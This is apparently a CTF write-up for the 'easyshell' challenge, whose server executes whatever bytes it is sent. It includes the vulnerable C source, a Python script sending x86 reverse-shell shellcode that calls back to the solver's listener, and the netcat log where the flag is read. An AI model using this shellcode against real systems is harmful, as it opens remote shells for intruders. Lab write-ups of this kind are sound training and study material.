# easyshell

## Challenge

> The server will run any code you send it. Easy peaasy!

> The flag is in /home/ctf/flag.txt

> nc easyshell-f7113918.ctf.bsidessf.net 5252

> [easyshell.zip](easyshell.zip)

## Solution
Upon examining the source code of the easyshell program it becomes clear that whatever is sent to the program will be read into a buffer and executed using the asm() C/C++ function used to embed and execute assembler instructions.

```
int main(int argc, char *argv[])
{
  uint8_t *buffer = mmap(NULL, LENGTH, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
  ssize_t len;

  alarm(10);

  disable_buffering(stdout);
  disable_buffering(stderr);

  printf("Send me stuff!!\n");
  len = read(0, buffer, LENGTH);

  if(len < 0) {
    printf("Error reading!\n");
    exit(1);
  }

  asm("call *%0\n" : :"r"(buffer));

  return 0;
}
```

After experimenting with different kinds of shellcode I decided that a reverse connection was the appropriate approach so I wrote a small python script to send the shellcode. (Shellcode taken from: http://shell-storm.org/shellcode/files/shellcode-833.php)

```
#!/usr/bin/env python

import socket

remote_host = 'easyshell-f7113918.ctf.bsidessf.net'
remote_port = 5252

local_host = "\xc6\xc6\xc6\xc6" # IP
local_port = "\xd9\x03"         # 55555 (Port)

shellcode = "\x68" + local_host + "\x5e\x66\x68" + local_port + "\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    client.connect((remote_host,remote_port))

    data = client.recv(1024)
    print data
    
    client.send(shellcode)
    print "[*] Shellcode sent."

except socket.error, e:
    print e 
```

I ran a netcat listener and upon receiving a connection it succesfully spawned a shell and the flag could be read.
```
Listening on [0.0.0.0] (family 0, port 55555)
Connection from [104.196.247.127] port 55555 [tcp/*] accepted (family 2, sport 33950)
cat /home/ctf/flag.txt
FLAG:c832b461f8772b49f45e6c3906645adb
```
